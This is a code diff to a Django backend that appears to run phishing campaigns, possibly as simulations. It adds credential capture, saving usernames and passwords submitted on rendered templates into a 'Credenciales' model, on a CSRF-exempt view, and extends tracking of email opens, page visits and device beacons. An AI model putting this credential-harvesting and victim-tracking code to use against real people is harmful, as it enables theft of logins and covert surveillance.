@@ -5,7 +5,7 @@ from user_agents import parse
 from django.views.decorators.csrf import csrf_exempt
 from django.http import FileResponse, Http404, JsonResponse, HttpResponse
 from django.template import Context, Template
-from backend.registradores.models import Registro, Estatus_Mail, Estatus_PC, Estatus_Web
+from backend.registradores.models import Estatus_Mail, Estatus_PC, Estatus_Web, Credenciales
 from backend.plantillas.models import Plantillas
 from backend.smtp.models import Enviados
 
@@ -16,18 +16,17 @@ def mail_status(request, int=None, imagen=None):
     enviado = Enviados.objects.get(id=int)
     data = registrar(request)
 
-    registro = Registro.objects.filter(enviado=enviado).update(
+    Estatus_Mail.objects.filter(enviado=enviado).update(
         ip=data["ip"],
-        user_agent=data["user_agent"],
+        agente=data["agente"],
         pais=data["pais"],
-        agente=request.method,
+        metodo=request.method,
         parametros=request.GET.dict(),
         sistema_operativo=data["sistema_operativo"],
         dispositivo=data["dispositivo"],
         idioma=data["idioma"],
         fecha=data["fecha"]
     )
-    estatus_mail = Estatus_Mail.objects.create(enviado=enviado, registro=registro)
 
 
     try:
@@ -41,38 +40,43 @@ def mail_status(request, int=None, imagen=None):
     return FileResponse(open(image.path, 'rb'))
 
 
-
+@csrf_exempt
 def web_estatus(request, int=None):
-
-    if request.method == 'POST' and request.POST.get('descarga'):
-        plantilla_id = request.POST['plantilla_id']
-        archivo = Plantillas.objects.get(id=plantilla_id).archivo
-        file_path = archivo.path
-        return FileResponse(open(file_path, 'rb'))
 
     enviado = Enviados.objects.get(id=int)
     data = registrar(request)
 
-    registro = Registro.objects.filter(enviado=enviado).update(
+    Estatus_Web.objects.filter(enviado=enviado).update(
         ip=data["ip"],
-        user_agent=data["user_agent"],
+        agente=data["agente"],
         pais=data["pais"],
-        agente=request.method,
+        metodo=request.method,
         parametros=request.GET.dict(),
         sistema_operativo=data["sistema_operativo"],
         dispositivo=data["dispositivo"],
         idioma=data["idioma"],
         fecha=data["fecha"]
     )
-    estatus_web = Estatus_Web.objects.create(enviado=enviado, registro=registro)
+
+
+    if request.method == 'POST' and request.POST.get('descarga'):
+        plantilla_id = request.POST['plantilla_id']
+        archivo = Plantillas.objects.get(id=plantilla_id).archivo
+        file_path = archivo.path
+        return FileResponse(open(file_path, 'rb'))
+    
+    elif request.method == 'POST' and request.POST.get('credenciales'):
+        estatus_web = Estatus_Web.objects.get(enviado=enviado)
+        Credenciales.objects.create(estatus_web=estatus_web, usuario=request.POST.get('usuario'), contraseña=request.POST.get('contraseña'))
 
     plantilla_id = Enviados.objects.get(id=int).plantilla.id
+    usuario = Enviados.objects.get(id=int).correo
     html_content = Plantillas.objects.get(id=plantilla_id).plantilla
     template = Template(html_content)
-
     context = Context({
 
         'id': enviado.id,
+        'usuario':usuario
 
     })
     rendered_html = template.render(context)
@@ -91,18 +95,18 @@ def pc_estatus(request, int=None):
         enviado = Enviados.objects.get(id=int)
         data = registrar(request)
 
-        registro = Registro.objects.filter(enviado=enviado).update(
+        Estatus_PC.objects.filter(enviado=enviado).update(
             ip=data["ip"],
-            user_agent=data["user_agent"],
+            agente=data["agente"],
             pais=data["pais"],
-            agente=request.method,
+            metodo=request.method,
             parametros=request.GET.dict(),
             sistema_operativo=data["sistema_operativo"],
             dispositivo=data["dispositivo"],
             idioma=data["idioma"],
             fecha=data["fecha"]
         )
-        estatus_pc = Estatus_PC.objects.create(enviado=enviado, registro=registro)
+
 
         return JsonResponse({'Estatus':'ok'}, safe=False)
     else:
